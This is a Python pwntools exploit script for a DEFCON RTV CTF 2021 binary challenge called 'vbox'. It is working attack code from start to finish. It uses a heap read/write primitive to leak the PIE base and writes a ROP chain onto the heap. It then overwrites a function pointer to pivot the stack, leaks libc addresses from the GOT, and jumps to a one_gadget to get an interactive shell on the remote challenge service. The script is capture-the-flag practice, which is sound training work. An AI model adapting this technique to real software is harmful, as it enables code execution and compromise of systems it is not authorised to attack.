# DEFCON RTV CTF 2021 - vbox exploit
# by macz - nice teamwork with adamm

from pwn import *

context.terminal = '/root/tools/launch-term' # set -x; eval $(echo "x-terminal-emulator-putty -e $*")

#binary name & args
challenge_exe = ['./target.patched'] # patched target with final libc (patchelf)

#env
context.binary = challenge_exe[0]
binary = ELF(challenge_exe[0])

# libc local & remote
# patchelfed
libc = ELF("./libc6_2.31-0ubuntu9.2_amd64.so") 
oneg = 0xe6c7e # https://github.com/ChrisTheCoolHut/angry_gadget a for the win !!! or use RECENT one_gadget :-)

#settings
ssh_host = ''
ssh_user = ''
ssh_pass = ''
ssh_port = 22

# REMOTE, Docker etc.
if args['DOCKER']:
 service_host = args['DOCKER'].split(":")[0]
 service_port = args['DOCKER'].split(":")[1]
else:
 docker = 'pwnremote.threatsims.com:9003'
 service_host = docker.split(":")[0]
 service_port = docker.split(":")[1]

# start

if args['GDB']:
 p = gdb.debug(challenge_exe,
 '''
 #put here all needed gdb init commands
 source /root/tools/gef.py
 #source /root/tools/pwndbg/gdbinit.py
 set disassembly-flavor intel
 #break after fgets
 pie breakpoint *0x127a
 ''')
#,aslr=False) can use "NOASLR" in pwntools cmd line
else:
 if args['SSH']:
  sh = ssh(host=ssh_host, user=ssh_user, password=ssh_pass, port=ssh_port)
  p = sh.run('/bin/bash')
  junk = p.recv(4096,timeout=2)
  p.sendline(challenge_exe)
 else:
  if args['REMOTE']:
   p = remote(service_host,service_port)
  else:
   p = process(challenge_exe,setuid=True)

# onegadgets = one_gadget(libcname)
def one_gadget(filename):
  return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

def get_PIE_base(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    return int(memory_map[1].split("-")[0],16)

# exploit starts here ##############################################

def forward_rw_pointer(steps, size):
        p.sendlineafter(b"> ",b"3") # set size
        p.sendline(str(size).encode("utf-8"))  
        for i in range(steps):
         p.sendlineafter(b"> ",b"1")

def leak():
        forward_rw_pointer(5, 8)
        handle_read = u64(p.recv(6).ljust(8,b'\x00'))
        log.info("handle_read: "+hex(handle_read))
        forward_rw_pointer(2, 8)
        handle_write = u64(p.recv(6).ljust(8,b'\x00'))
        log.info("handle_write: "+hex(handle_write))
        return handle_read

def heap_write(pos,data):
        #print(pos, enhex(data))
        p.sendlineafter(b"> ",b"4") # reset state
        forward_rw_pointer(pos, 8)
       
        p.sendlineafter(b"> ",b"3") ### set rw size
        p.sendline(str(len(data)).encode("utf-8"))  ###

        p.sendlineafter(b"> ",b"2") # 
        p.sendline(data+b"\n")

def heap_write_with_nullbytes_string(pos,string): # can be done smarter, but no energy left
        for i in range(len(string)-1,-1,-1):
         heap_write(pos, b'x'*i +  b'%c' % string[i])

# some strange artificial gadgets in exe
gadget_1 = 0x1475        # jmp qword ptr [rcx+10h]
gadget_2 = 0x127A        # lea rax, [rcx+10h]; mov r11, rcx; call qword ptr [rax+8]; pop rbx; mov rdx, [rbx]; retn
gadget_3 = 0x1687        # mov rsp, r11; pop r15; pop r14; pop rbx; pop rsi; retn
gadget_ret = 0x1016      # ret
gadget_call_rax = 0x1010 # call rax
gadget_pop_5 = 0x16f3    # pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
gadget_pop_4 = 0x16f4    # pop r12; pop r13; pop r14; pop r15; ret;
gadget_mov_rdi_rsp = 0x1478 # mov rdi, rsp; ret

# leak base
read = leak()
base = read - binary.symbols['handle_read'] # 0x11F5
log.info("pie_base : "+hex(base))
binary.address = base

# libc leaks and ident chain
rop = ROP([binary])
rop.puts(base+0x20d8) # print "Exiting session..." as marker, so to catch stuff after
rop.puts(binary.got['puts'])
rop.puts(binary.got['strcpy'])
rop.puts(binary.got['write'])
rop.puts(binary.got['strlen'])
rop.puts(binary.got['setvbuf'])
rop.puts(binary.got['printf'])

# clear registers for one_gadget later
rop.raw(base+gadget_pop_4) #: pop r12; pop r13; pop r14; pop r15; ret; 
rop.raw(0x0)
rop.raw(0x0)
rop.raw(0x0)
rop.raw(0x0)

# cause restart does not work use stripped_read() for reading one qword up to first 0x00 into the actual "stack"
rop.raw(base+gadget_mov_rdi_rsp)   #: mov rdi, rsp; ret; 
rop.raw(binary.symbols['stripped_read']) # stripped_read()
rop.raw(base + 0x1110) #restart - does not work either, cause running out of stack space (heap pivot)
#print rop.dump()
payload = rop.chain()

# write ropchain to heap, dont kill heap-top
for i in range((len(payload)//8)-1,-1,-1):
 heap_write_with_nullbytes_string(5+3+i,payload[i*8:i*8+8])

# this is chaining those gadgets to pivot to heap and get the ropchain started - took many hours to figure
heap_write_with_nullbytes_string(0,p64(base+gadget_ret)+p64(base+gadget_3)+p64(base+gadget_pop_5))

# overwrite handle_write function pointer - must be one shot, cause after handle_write function is broken
heap_write(1+5,p64(base+gadget_2)) 

# reset for fun
p.sendlineafter(b"> ",b"4") # reset

# trigger
p.sendlineafter(b"> ",b"2")
p.sendline(b"a")

# leaks
p.readuntil("Exiting session...\n") # wait for marker string
puts_got = u64(p.readline()[:-1]+b"\x00"*2)
log.info("puts@got: " + hex(puts_got))

strcpy_got = u64(p.readline()[:-1]+b"\x00"*2)
log.info("strcpy@got: " + hex(strcpy_got))

write_got = u64(p.readline()[:-1]+b"\x00"*2)
log.info("write@got: " + hex(write_got))

strlen_got = u64(p.readline()[:-1]+b"\x00"*2)
log.info("strlen@got: " + hex(strlen_got))

setvbuf_got = u64(p.readline()[:-1]+b"\x00"*2)
log.info("setvbuf@got: " + hex(setvbuf_got))

printf_got = u64(p.readline()[:-1]+b"\x00"*2)
log.info("printf@got: " + hex(printf_got))

libc.address = puts_got - libc.symbols['puts']
log.info("libcbase:  " + hex(libc.address))

# send desperately one qword (zero bytes kill us) - one_gadget
p.sendline(b"A"*8 + p64(libc.address + oneg)+b"\n")

p.sendline(b"id")

p.interactive()
